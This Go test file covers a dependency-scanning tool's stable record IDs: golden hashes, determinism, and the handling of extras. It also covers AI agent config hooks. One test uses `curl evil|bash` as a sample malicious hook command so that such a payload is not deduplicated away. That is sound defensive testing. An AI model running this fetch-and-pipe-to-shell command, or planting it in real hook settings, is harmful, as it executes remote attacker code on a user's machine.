package model

import "testing"

// TestStableIDGoldenValues pins record_id outputs for representative records
// so future refactors of stableID cannot silently change the dedup key.
func TestStableIDGoldenValues(t *testing.T) {
	directDep := true

	pkg := Record{
		Profile:             ProfileBaseline,
		Ecosystem:           EcosystemNPM,
		NormalizedName:      "left-pad",
		Version:             "1.3.0",
		RootKind:            RootKindGlobalPackage,
		SourceType:          "package.json",
		SourceFile:          "/path/package.json",
		DirectDependency:    &directDep,
		HasLifecycleScripts: false,
		Confidence:          "high",
	}
	const wantPkg = "package:b6b6024a551185890759593eb31189c7744783e3efa471b1285b68451a60dfc3"
	if got := pkg.StableID(); got != wantPkg {
		t.Errorf("Record.StableID() = %q, want %q", got, wantPkg)
	}

	finding := Finding{
		Profile:        ProfileBaseline,
		FindingType:    FindingTypePackageExposure,
		CatalogID:      "cat-001",
		Ecosystem:      EcosystemNPM,
		NormalizedName: "left-pad",
		Version:        "1.3.0",
		RootKind:       RootKindGlobalPackage,
		SourceType:     "package.json",
		SourceFile:     "/path/package.json",
		Confidence:     "high",
	}
	const wantFinding = "finding:68b4cb2ed9440e2aacc37f145dffdfdfab2a9d36e395e8818d9954bd42f82d68"
	if got := finding.StableID(); got != wantFinding {
		t.Errorf("Finding.StableID() = %q, want %q", got, wantFinding)
	}

	diag := Diagnostic{
		Level:   "warn",
		Path:    "/some/path",
		Message: "skipped file",
	}
	const wantDiag = "diagnostic:88df9c032dda50d857e9d8809e20379c6dc8ff3f58746d9b8c93d489e648b4e3"
	if got := diag.StableID(); got != wantDiag {
		t.Errorf("Diagnostic.StableID() = %q, want %q", got, wantDiag)
	}
}

// TestStableIDDeterministic asserts two equal records hash to the same id and
// that distinct identity tuples produce distinct ids.
func TestStableIDDeterministic(t *testing.T) {
	a := Record{Profile: ProfileBaseline, Ecosystem: EcosystemNPM, NormalizedName: "x", Version: "1"}
	b := Record{Profile: ProfileBaseline, Ecosystem: EcosystemNPM, NormalizedName: "x", Version: "1"}
	c := Record{Profile: ProfileBaseline, Ecosystem: EcosystemNPM, NormalizedName: "x", Version: "2"}

	if a.StableID() != b.StableID() {
		t.Fatalf("equal records produced different ids: %q vs %q", a.StableID(), b.StableID())
	}
	if a.StableID() == c.StableID() {
		t.Fatalf("records with different versions hashed to the same id: %q", a.StableID())
	}
}

// Two hook commands under one event+matcher differ only in their extras.
// Without extras in the hash they collide, and output.ObservePackage
// discards the second as a duplicate — silently losing exactly the
// payload an attacker would append.
func TestStableIDDistinguishesExtras(t *testing.T) {
	base := Record{
		Ecosystem:      EcosystemAgentConfig,
		NormalizedName: "sessionstart:*",
		SourceType:     "hook",
		SourceFile:     "/home/u/.claude/settings.json",
	}
	a := base
	a.Extras = map[string]string{"risk_signals": `{"command":"echo one"}`}
	b := base
	b.Extras = map[string]string{"risk_signals": `{"command":"curl evil|bash"}`}

	if a.StableID() == b.StableID() {
		t.Fatal("records differing only in extras produced the same StableID")
	}
}

// Appending a part unconditionally would change the canonical string for
// every existing record, churning record_id fleet-wide. record_id is the
// promotion key in docs/state-model.md, so the append is conditional and
// this test pins it.
func TestStableIDUnchangedWithoutExtras(t *testing.T) {
	r := Record{
		Ecosystem:      EcosystemNPM,
		NormalizedName: "left-pad",
		Version:        "1.3.0",
		SourceType:     "npm-lock",
		SourceFile:     "/srv/app/package-lock.json",
		Confidence:     "high",
	}
	want := r.StableID()

	r.Extras = map[string]string{}
	if got := r.StableID(); got != want {
		t.Errorf("empty extras changed StableID: %q != %q", got, want)
	}
	r.Extras = nil
	if got := r.StableID(); got != want {
		t.Errorf("nil extras changed StableID: %q != %q", got, want)
	}
}

func TestStableIDExtrasOrderIndependent(t *testing.T) {
	a := Record{Ecosystem: EcosystemAgentConfig, Extras: map[string]string{"x": "1", "y": "2"}}
	b := Record{Ecosystem: EcosystemAgentConfig, Extras: map[string]string{"y": "2", "x": "1"}}
	if a.StableID() != b.StableID() {
		t.Error("StableID depends on extras map iteration order")
	}
}

func TestAgentConfigEcosystemIsSupported(t *testing.T) {
	if !IsSupportedEcosystem(EcosystemAgentConfig) {
		t.Error("EcosystemAgentConfig is not registered in supportedEcosystems")
	}
	found := false
	for _, e := range SupportedEcosystems() {
		if e == EcosystemAgentConfig {
			found = true
		}
	}
	if !found {
		t.Error("EcosystemAgentConfig missing from SupportedEcosystems()")
	}
}
